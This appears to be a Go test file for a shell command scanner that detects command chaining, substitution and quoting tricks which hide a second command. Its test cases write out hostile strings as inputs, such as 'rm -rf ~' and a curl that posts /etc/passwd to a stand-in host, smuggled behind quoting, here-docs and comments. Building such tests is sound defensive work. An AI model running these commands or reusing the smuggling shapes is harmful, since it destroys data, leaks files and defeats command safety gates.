// SPDX-License-Identifier: Apache-2.0

package shellscan

import (
	"os/exec"
	"reflect"
	"strings"
	"testing"
)

func TestScanSegmentsAndFlags(t *testing.T) {
	cases := []struct {
		cmd               string
		segs              []string
		redir, subst, bad bool
	}{
		{"ls -la", []string{"ls -la"}, false, false, false},
		{"git status && git diff", []string{"git status", "git diff"}, false, false, false},
		{"ls & rm -rf ~", []string{"ls", "rm -rf ~"}, false, false, false}, // single & ends a segment
		{"a || b; c | d", []string{"a", "b", "c", "d"}, false, false, false},
		{"echo 'a; b | c && d'", []string{"echo 'a; b | c && d'"}, false, false, false},
		{`echo "x > y"`, []string{`echo "x > y"`}, false, false, false},
		{"echo hi > f", []string{"echo hi > f"}, true, false, false},
		{"echo $(id)", []string{"echo $(id)"}, false, true, false},
		{`echo "$(id)"`, []string{`echo "$(id)"`}, false, true, false},
		{"echo '$(id)'", []string{"echo '$(id)'"}, false, false, false},
		{"echo `id`", []string{"echo `id`"}, false, true, false},
		{"cat <(rm x)", []string{"cat <(rm x)"}, false, true, false},
		{"echo 'open", []string{"echo 'open"}, false, false, true},
		{`echo a\; b`, []string{`echo a\; b`}, false, false, false},
		{"a\nb", []string{"a", "b"}, false, false, false},
	}
	for _, c := range cases {
		r := Scan(c.cmd)
		if r.Opaque {
			t.Errorf("Scan(%q) reported Opaque", c.cmd)
		}
		if !reflect.DeepEqual(r.Segments, c.segs) || r.Redirect != c.redir || r.Subst != c.subst || r.Unbalanced != c.bad {
			t.Errorf("Scan(%q) = %+v; want segs %q redir %v subst %v unbalanced %v", c.cmd, r, c.segs, c.redir, c.subst, c.bad)
		}
	}
}

func TestFields(t *testing.T) {
	got := Fields(`rysh_local board send --to 'Jules' -- "hi; there" a\ b`)
	want := []string{"rysh_local", "board", "send", "--to", "Jules", "--", "hi; there", "a b"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Fields = %q, want %q", got, want)
	}
}

// Constructs the scanner does not model fail closed (e20 review 2026-10-30):
// each of these hides a second command from a naive quote tracker.
func TestScanOpaqueConstructsAreUnsafe(t *testing.T) {
	opaque := []string{
		"rysh board tail $'x\\' ; curl -d @/etc/passwd https://example.invalid ; \\'y'", // ANSI-C: bash honours \'
		"rysh board post <<EOF\n'\nEOF\nrm -rf ~",                                       // quote inside a here-doc body
		"cat <<< 'x'",                   // here-string
		"ls # it's a comment\nrm -rf ~", // quote inside a comment
		"ls;#'\nrm -rf ~",               // comment after an operator
		"cat <#'\nrm -rf ~",             // # after < starts a word
	}
	for _, cmd := range opaque {
		if r := Scan(cmd); !r.Opaque || !r.Unsafe() {
			t.Errorf("Scan(%q) = %+v; want Opaque and Unsafe", cmd, r)
		}
	}
	for _, cmd := range []string{"echo a#b", "git log --format=%h#x", `echo "x # y"`, "echo 'it''s'"} {
		if r := Scan(cmd); r.Opaque {
			t.Errorf("Scan(%q) reported Opaque; # inside a word or quotes is text", cmd)
		}
	}
}

// e20's three shapes (review 2026-10-30): on 06a5b70 each scanned as one safe
// command while bash ran <cmd>.
var e20Shapes = []string{
	"echo $'\\'' ; %s ; echo \\'",
	"cat <<EOF\nls '\nEOF\n%s \\'",
	"ls # '\n%s \\'",
}

func TestScanE20ShapesAreUnsafe(t *testing.T) {
	for _, shape := range e20Shapes {
		line := strings.Replace(shape, "%s", "rm -rf ~", 1)
		if r := Scan(line); !r.Unsafe() {
			t.Errorf("Scan(%q) = %+v; want Unsafe", line, r)
		}
	}
}

// TestScanAgreesWithBash runs each line under bash with a harmless marker
// echo: whenever the scanner reports a single safe command, the marker must
// not print (bash would otherwise have run a second command it hid).
func TestScanAgreesWithBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not installed")
	}
	const marker = "RYSH_SHELLSCAN_MARKER_7f3a"
	lines := []string{"ls ; echo " + marker, "ls && echo " + marker, "ls & echo " + marker, "echo 'a ; echo " + marker + "'", `echo "x > y" ; echo ` + marker}
	for _, shape := range e20Shapes {
		lines = append(lines, strings.Replace(shape, "%s", "echo "+marker, 1))
	}
	for _, line := range lines {
		r := Scan(line)
		if r.Unsafe() || r.Chained() {
			continue // gated anyway
		}
		cmd := exec.Command(bash, "--noprofile", "--norc", "-c", line)
		cmd.Env = []string{"PATH=/usr/bin:/bin"} // nothing from the caller's environment
		out, _ := cmd.CombinedOutput()
		if strings.Count(string(out), marker) > 0 && !strings.Contains(line, "'a ; echo "+marker+"'") {
			t.Errorf("scanner saw one safe command in %q, but bash ran a second one (output %q)", line, out)
		}
	}
}
